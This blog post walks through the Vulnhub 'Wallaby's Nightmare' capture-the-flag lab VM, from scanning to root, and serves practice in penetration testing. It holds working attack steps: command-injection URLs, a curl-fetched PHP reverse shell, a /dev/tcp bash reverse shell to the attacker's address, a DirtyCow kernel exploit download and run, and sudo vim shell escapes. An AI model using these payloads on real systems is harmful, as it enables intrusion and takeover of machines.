---
layout: post
title: "Wallaby's Nightmare Walkthrough (Vulnhub)"
date: 2017-01-03 12:00:00
share: true
comments: true
tags: [Vulnhub Walkthrough]
---

Wallaby's: Nightmare VM can be downloaded [here](https://www.vulnhub.com/entry/wallabys-nightmare-102,176/).

First we'll start by scanning the victim's machine, `netdiscover` wasn't able to find the VM's IP so I did a quick subnet scan with nmap.

```console
root@kali:~# nmap -F 192.168.1.0/24
...
Nmap scan report for 192.168.1.68
Host is up (0.000094s latency).
Not shown: 98 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:63:9C:F9 (Oracle VirtualBox virtual NIC)
...
```

Full scan yields the same results, so let's jump right into the web server.

## Wallaby's server

I thought the form was vulnerable to some sort of code injection but it wasn't, yet it was vulnerable to XSS (try `<script>alert(1)</script>`). The author is nice enough to give you some hints, this challenge requires you to do some basic fuzzing, which could mean a lot of frustration too. 

Wallaby seems to be very determined, he even made a page to mock you.

```
What the heck is this? Some guy named abatchy is trying to penetrate my server? Loser must not know I'm the great Wallaby!
```

Let's observe him for now, maybe I could learn about him from his behavior.

![](http://i.imgur.com/enwMemI.jpg)

---

The url format might be vulnerable to LFI, `http://192.168.1.68/?page=/etc/passwd shows `/etc/passwd` file, or that's what you think!

Try any other file and you'll get various custom error messages, which made me believe the `/etc/passwd` file we see is fake, if the **/etc/passwd** string exists for the page parameter it's returned.

After poking around a little I got the following message!

```
That's some fishy stuff you're trying there abatchy buddy. You must think Wallaby codes like a monkey! I better get to securing this SQLi though...

(Wallaby caught you trying an LFI, you gotta be sneakier! Difficulty level has
increased.)
```

---

Afterwards the website wouldn't load any more, I thought I broke the server accidentally by running other tools against it and even reverted the machine, yet when it happened again I did another port scan on it.

Guess what?

Webserver is now running on port 60080, that must be Wallaby's homemade IDS...

```
HOLY MOLY, this guy abatchy wants me...Glad I moved to a different port so I
could work more securely!!!
```


As we all know, **_security by obscurity_** is the way to go...
![](http://i.imgur.com/Fcuw0Sx.png)

---

The image didn't contain any hidden messages / comments / files, so I continued doing more bruteforcing for the possible LFI vulnerability discovered. `dirsearch` didn't work properly, so I had to go back to the old `dirbuster`.

![](http://i.imgur.com/ptbv4Sk.png)

Although you'll notice that all urls found are `index.php`, check the size column,  they're different! Definitely something worth checking. Luckily I ran `dirbuster` from the terminal so I could see that the hit urls are different than seen in the table, anyhow rightclick the row and check the response for each.

```console
root@kali:~/Desktop/dirsearch# dirbuster
Starting OWASP DirBuster 1.0-RC1
Starting URL fuzz
Starting fuzz on http://192.168.1.68:60080/index.php?page={dir}
Dir found: /index.php?page=index - 200
Dir found: /index.php?page=%27 - 200
Dir found: /index.php?page=mailer - 200
Dir found: /index.php?page=contact - 200
Dir found: /index.php?page=home - 200
Dir found: /index.php?page=blacklist - 200
Dir found: /index.php?page=who%27s-connecting - 200
DirBuster Stopped
```

You better go through them one by one. One of them is the key. Stop reading if you didn't figure it out yet.

---

## Getting limited shell

Did you figure it out?

`index.php?page=mailer` is the one to check to the comments found in the source.

```html
<h2 style='color:blue;'>Coming Soon guys!</h2>
    <!--a href='/?page=mailer&mail=mail wallaby "message goes here"'><button type='button'>Sendmail</button-->
    <!--Better finish implementing this so abatchy
 can send me all his loser complaints!-->
```

Is the mail functionality implemented? Probably not, but the way the second parameter is sent looks to be passed directly into some interpreter.

  * `/index.php?page=mailer&mail=whoami` returns `www-data`! Let's try to start a listener on our attacking machine and get a reverse shell!

  * `index.php?page=mailer&mail=nc -nv 192.168.1.67 -e /bin/bash` didn't work, Wallaby was again one step ahead of us.


```
"How you gonna use netcat so obviously. Cmon man. This is all in the logs."
```

After running a few commands I noticed that netcat exists under `/bin/netcat` but doesn't have the `-e` option available. That is not an issue thanks to [this](https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem). But I prefer using the php reverse shell script, which can be found [here](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).

Save it as .txt so it doesn't get interpreted and store it on the victim's
machine.

Requested url:
```
http://192.168.1.68:60080/index.php?page=mailer&mail=curl http://192.168.1.67/4444.txt > shell.php; chmod 777 shell.php; ls -al
```

Response:
```
total 104
drwxr-xr-x 3 www-data www-data  4096 Jan  2 22:16 .
drwxr-xr-x 3 root     root      4096 Dec 16 21:31 ..
-rw-r--r-- 1 root     root     15953 Aug 11  2015 eye.jpg
-rw-r--r-- 1 root     root      3639 Dec 27 19:19 index.php
drwxr-xr-x 2 root     root      4096 Dec 27 12:25 s13!34g$3FVA5e@ed
-rw-r--r-- 1 root     root     57626 Dec 27 12:24 sec.png
-rwxrwxrwx 1 www-data www-data  5494 Jan  2 22:16 shell.php
-rw-r--r-- 1 www-data www-data     8 Jan  2 21:07 uname.txt
```

Hit `/shell.php` and you'll get your shell!

```console
root@kali:/var/www/html# nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.1.67] from (UNKNOWN) [192.168.1.68] 39308
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 22:20:52 up  1:22,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
waldo    pts/0    tmux(722).%0     20:57    1:23m  0.39s  0.39s irssi
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/$
```

---

## Privilege escalation

There are two different ways to get root, one through dirty cow, and another
by escalating privileges to waldo then wallaby.


#### Dirty cow

[cowroot.c](http://cowroot.c/) worked fine. You can prevent kernel from crashing
[too](https://github.com/dirtycow/dirtycow.github.io/issues/25#issuecomment-255852675).
This is not the expected method to get root access though.

```console
www-data@ubuntu:/$ cd /tmp
cd /tmp
www-data@ubuntu:/tmp$ wget https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c
<fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c
...
Length: 4688 (4.6K) [text/plain]
Saving to: 'cowroot.c'

cowroot.c           100%[===================>]   4.58K  --.-KB/s    in 0s

2017-01-02 22:27:42 (9.57 MB/s) - 'cowroot.c' saved [4688/4688]

www-data@ubuntu:/tmp$ gcc cowroot.c -o cowroot -pthread
...
www-data@ubuntu:/tmp$ ./cowroot
./cowroot
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 54256
Racing, this may take a while..
thread stopped
thread stopped
/usr/bin/passwd overwritten
Popping root shell.
Don't forget to restore /tmp/bak
root@ubuntu:/tmp#  echo 0 > /proc/sys/vm/dirty_writeback_centisecs
 echo 0 > /proc/sys/vm/dirty_writeback_centisecs
root@ubuntu:/tmp# whoami
whoami
root
```

#### Privilege escalation to waldo

One thing you should always do is running `sudo -l` when possible, this proved to be very useful.

```console
www-data@ubuntu:/tmp$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (waldo) NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf
    (ALL) NOPASSWD: /sbin/iptables
```

Two different rules, does that mean two different ways to get higher privileges? Possibly.

You might've noticed that port 6667 was marked as filtered in your nmap scan, guess you were right! Check the current `iptables` rules.


```console
www-data@ubuntu:/tmp$ sudo /sbin/iptables -L
sudo /sbin/iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination
ACCEPT     tcp  --  localhost            anywhere             tcp dpt:ircd
DROP       tcp  --  anywhere             anywhere             tcp dpt:ircd

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
```

Let's flush them so IRC is unblocked.
```console
www-data@ubuntu:/tmp$ sudo /sbin/iptables --flush
sudo /sbin/iptables --flush
www-data@ubuntu:/tmp$ sudo /sbin/iptables -L
sudo /sbin/iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
```

If you run nmap again you'll notice that port 6667 is no longer blocked, I
used `hexchat` to connect to IRC.

You'll also notice that there are no channels to join, I kept going through the `/home` directory till I found `/home/wallaby/.sopel/logs/raw.log`, which mentions a channel called `#wallabyschat`!

```console
www-data@ubuntu:/home/wallaby/.sopel/logs$ cat raw.log | grep "#"
>>1481932041.885489 JOIN #wallabyschat
```

After you join it (using `/join #wallabyschat`) you'll see user waldo and wallabysbot.


[![](http://i.imgur.com/kAUCk1b.png)](http://i.imgur.com/kAUCk1b.png)


Neither waldo nor the bot will talk to you, so I went through the logs again and found that the bot responds to `.help` command.

```
<wallabysbot> You can see more info about any of these commands by doing .help <command> (e.g. .help time)
<wallabysbot> ADMIN         set  quit  join  mode  msg  me  save  part
<wallabysbot> ADMINCHANNEL  kickban  showmask  ban  topic  quiet  kick  tmask
<wallabysbot>               unquiet  unban
<wallabysbot> ANNOUNCE      announce
<wallabysbot> CORETASKS     blocks  useserviceauth
<wallabysbot> HELP          help
<wallabysbot> RUN           run
```

One interesting command is `.run` command only runs for waldo. After some digging I found that the script responsible for this is the `run.py` file under `/home/wallaby/.sopel/modules`.

```python
import sopel.module, subprocess, os
from sopel.module import example

@sopel.module.commands('run')
@example('.run ls')
def run(bot, trigger):
     if trigger.owner:
          os.system('%s' % trigger.group(2))
          runas1 = subprocess.Popen('%s' % trigger.group(2), stdout=subprocess.PIPE).communicate()[0]
          runas = str(runas1)
          bot.say(' '.join(runas.split('\\n')))
     else:
          bot.say('Hold on, you aren\'t Waldo?')
```

You need to kick out waldo so you can use its nick and let the bot run commands as wallaby. How do we do that? Remember the vim command in `sudo -l`?

```console
www-data@ubuntu:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (waldo) NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf
    (ALL) NOPASSWD: /sbin/iptables
www-data@ubuntu:/$ sudo -u waldo usr/bin/vim /etc/apache2/sites-available/000-default.conf
fault.confldo usr/bin/vim /etc/apache2/sites-available/000-de
```
Next, type `:!bash`

```console
waldo@ubuntu:/$ whoami
whoami
waldo
```

We got a shell for waldo! You can now attach the tmux terminal and use waldo's session. Now, either log out waldo OR use the CLI based IRC client running to run commands as him. I chose the first since I'd rather use a GUI.

#### On waldo's shell

1\. "tmux attach"
2\. /exit

```
    * waldo has quit (Quit: leaving)
```
On hexchat:

1\. /nick waldo
```
    * You are now known as waldo
```

2\. Go to wallabysbot window and chat with the bot, you can now run `.run whoami`

```
    <waldo> .run whoami
    <wallabysbot> b'wallaby
```


Now you can run code as wallaby!

The `.run` command felt very tricky to me, initially I created a revsh payload through msfvenom, uploaded it and ran it using the full path. I discovered later an easier approach, discussed below.

Let's get a shell by starting a listener on 8080 on our attacking machine, then type the following:

```
    .run bash -c "bash -i >& /dev/tcp/192.168.94.128/8080 0>&1"
```

```console
root@kali:~# nc -nvlp 8080
listening on [any] 8080 ...
connect to [192.168.94.128] from (UNKNOWN) [192.168.94.131] 48748
bash: cannot set terminal process group (637): Inappropriate ioctl for device
bash: no job control in this shell
wallaby@ubuntu:~$ sudo -l
sudo -l
Matching Defaults entries for wallaby on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wallaby may run the following commands on ubuntu:
    (ALL) NOPASSWD: ALL
wallaby@ubuntu:~$ sudo su
sudo su
whoami
root
cd /root
ls -al
total 48
drwx------  4 root root 4096 Dec 27 19:31 .
drwxr-xr-x 22 root root 4096 Dec 14 19:24 ..
drwxr-xr-x  2 root root 4096 Dec 27 11:27 backups
-rw-------  1 root root    1 Dec 27 12:26 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rwxr-xr-x  1 root root  510 Dec 27 19:31 check_level.sh
-rw-r--r--  1 root root  342 Dec 16 16:52 flag.txt
-rw-------  1 root root   18 Dec 15 13:03 .mysql_history
drwxr-xr-x  2 root root 4096 Dec 15 13:10 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Dec 15 17:50 .selected_editor
-rw-r--r--  1 root root  214 Dec 16 17:09 .wget-hsts
cat flag.txt
###CONGRATULATIONS###

You beat part 1 of 2 in the "Wallaby's Worst Knightmare" series of vms!!!!

This was my first vulnerable machine/CTF ever!  I hope you guys enjoyed playing it as much as I enjoyed making it!

Come to IRC and contact me if you find any errors or interesting ways to root, I'd love to hear about it.

Thanks guys!
-Waldo
```

## Final notes

  * VM required a lot of bruteforcing, the mailer page was quite tricky and it was lucky for me to find it.
  * You can use both sudo NOPASSWD commands for getting a shell for waldo, either by getting a shell through vim or by using `iptables` to block waldo from connecting to IRC (thanks @audiblelink).
  * Even if you got root via dirtycow, make sure you try getting it through the intended path as well.
  * `/index.php?page=blacklist` POST request is vulnerable to RCE via the `bl` parameter, I discovered this after finishing the VM. Just try passing `bl=; whoami ;`.
  * `,run` command is tricky due to the underlying python script, you can either use `bash -c command`, write a script to execute or use an msfvenom payload.
  * Overall, very unique VM, the sopel bot was a pain in the ass till I figured out how it works.

Thanks Waldo for the VM and waiting for part 2!
